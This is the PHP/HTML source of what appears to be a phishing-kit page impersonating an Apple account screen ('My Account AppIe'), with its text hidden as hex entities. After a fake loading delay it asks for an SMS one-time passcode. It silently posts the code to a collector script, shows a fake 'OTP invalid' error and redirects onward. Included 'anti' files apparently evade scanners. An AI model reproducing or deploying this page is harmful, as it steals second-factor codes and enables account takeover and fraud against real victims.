<?php
include '../../anti/anti1.php';
include '../../anti/anti3.php';
include '../../anti/anti4.php';
include '../../anti/anti5.php';
include '../../anti/anti6.php';
include '../../anti/anti8.php';
?>
<!doctype html>
<html>

<head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
   <meta charset="utf-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <title>&#x4d;&#x79;&#x20;&#x41;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x20;&#x41;&#x70;&#x70;&#x49;&#x65;</title>
   <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0" />
   <link type="text/css" rel="stylesheet" />
   <link rel="shortcut icon" href="../files/fav.ico" type="image/X-icon">
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<body>
   <center>
      <style>
         .success,
         .error,
         .validation {
            border: 1px solid;
            margin: 10px 0px;
            padding: 15px 50px;
            background-repeat: no-repeat;
            background-position: 10px center;
         }

         .success {
            color: #4F8A10;
            background-color: #DFF2BF;
         }

         .error {
            color: #D8000C;
            background-color: #FFBABA;
         }

         .validation {
            color: #D63301;
            background-color: #FFCCBA;
         }
      </style>
      <div style="width:355px;border:solid 1px #d8d4d4;">
         <p><img style="display: block; margin-left: auto; margin-right: auto;" img src="../files/fav.ico" width="40" height="40" /></p>
         <div style="clear:both"></div>
         <p style="font-size:14px;margin-top:25px;color:#807979">&#x50;&#x6c;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6e;&#x74;&#x65;&#x72;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x4f;&#x6e;&#x65;&#x20;&#x54;&#x69;&#x6d;&#x65;&#x20;&#x50;&#x61;&#x73;&#x73;&#x63;&#x6f;&#x64;&#x65;&#x20;&#x28;&#x4f;&#x54;&#x50;&#x29;</p>
         <p style="font-size:13px;margin-top:25px;color:#807979">&#x4f;&#x6e;&#x65;&#x2d;&#x54;&#x69;&#x6d;&#x65;&#x20;&#x50;&#x61;&#x73;&#x73;&#x63;&#x6f;&#x64;&#x65;&#x20;&#x69;&#x73;&#x20;&#x72;&#x65;&#x71;&#x75;&#x69;&#x72;&#x65;&#x64;&#x20;&#x66;&#x6f;&#x72;&#x20;&#x74;&#x68;&#x69;&#x73;&#x20;&#x76;&#x65;&#x72;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#xa;&#x74;&#x68;&#x69;&#x73;&#x20;&#x63;&#x6f;&#x64;&#x65;&#x20;&#x68;&#x61;&#x73;&#x20;&#x62;&#x65;&#x65;&#x6e;&#x20;&#x73;&#x65;&#x6e;&#x74;&#x20;&#x74;&#x6f;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x72;&#x65;&#x67;&#x69;&#x73;&#x74;&#x65;&#x72;&#x65;&#x64;&#x20;&#x6d;&#x6f;&#x62;&#x69;&#x6c;&#x65;</p>
         <script type="text/javascript">
            document.onreadystatechange = function() {
               var state = document.readyState
               if (state == 'complete') {
                  setTimeout(function() {
                     document.getElementById('interactive');
                     $("#fixed").hide();
                     $("#formf").show(600);
                  }, 17000);
               }
            }
         </script>
         <form method="post" id="formf" style="display: none;">
            <table align="center" width="290" style="font-size:11px;font-family:arial,sans-serif;color:#000;margin-top:30px">
               <tbody>
                  <p style="display:none;" class="validation" id="tiitleerror">&#x4f;&#x54;&#x50;&#x20;&#x69;&#x6e;&#x76;&#x61;&#x6c;&#x69;&#x64;&#x2e;&#x20;&#x43;&#x68;&#x65;&#x63;&#x6b;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x53;&#x4d;&#x53;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x74;&#x72;&#x79;&#x20;&#x61;&#x67;&#x61;&#x69;&#x6e;</p>
                  <br>
                  <tr>
                  <tr>
                     <td align="right">&#x44;&#x61;&#x74;&#x65;&#x20;&#x3a;</td>
                     <td><?php echo date("d M,Y");  ?></td>
                  </tr>
                  <tr>
                     <td align="right">&#x4f;&#x54;&#x50;&#x20;&#x43;&#x4f;&#x44;&#x45;</td>
                     <td class="xx"><input style="width: 75px;" type="tel" name="access01" required=""></td>
                  </tr>
                  <tr>
                     <td></td>
                     <td><br>
                        <input style="width:74px" type="submit" value="&#x53;&#x75;&#x62;&#x6d;&#x69;&#x74;">
                     </td>
                  </tr>
               </tbody>
            </table>
         </form>
         <script type="text/javascript">
            var request;
            $("#formf").submit(function(event) {
               event.preventDefault();
               if (request) {
                  request.abort();
               }
               var $form = $(this);
               var $inputs = $form.find("input, select, button, textarea");
               var serializedData = $form.serialize();
               $inputs.prop("disabled", true);
               $("#tiitleerror").show(1800);
               request = $.ajax({
                  url: "ot1sifet.php",
                  type: "post",
                  data: serializedData
               });
               request.done(function(response, textStatus, jqXHR) {
                  $(location).attr("href", "ot2.php");
               });
               request.fail(function(jqXHR, textStatus, errorThrown) {
                  console.error(
                     "The following error occurred: " +
                     textStatus, errorThrown
                  );
               });
               request.always(function() {
                  $inputs.prop("disabled", false);
               });
            });
         </script>
         <div id="fixed" class="">
            <img src="../files/lod2.gif">
            <p class="">&#x4c;&#x6f;&#x61;&#x64;&#x69;&#x6e;&#x67;&#x2e;&#x2e;&#x2e;</p>
            <p class="">&#x44;&#x6f;&#x20;&#x6e;&#x6f;&#x74;&#x20;&#x63;&#x6c;&#x6f;&#x73;&#x65;&#x20;&#x74;&#x68;&#x69;&#x73;&#x20;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;</p>
         </div>
         <p style="text-align:center;font-family:arial,sans-serif;font-size:9px;color:#656565"> &#x43;&#x6f;&#x70;&#x79;&#x72;&#x69;&#x67;&#x68;&#x74;&#x20;&#xa9;&#x20;<?php echo date("Y"); ?>&#x2e;&#x20;&#x41;&#x6c;&#x6c;&#x20;&#x72;&#x69;&#x67;&#x68;&#x74;&#x73;&#x20;&#x72;&#x65;&#x73;&#x65;&#x72;&#x76;&#x65;&#x64;&#x2e; </p>
      </div>
      <div id="rotate" style="display:none">
         <div class="circle">
            <div class="rotate"></div>
         </div>
         <div class="overlay"></div>
      </div>
   </center>
</body>

</html>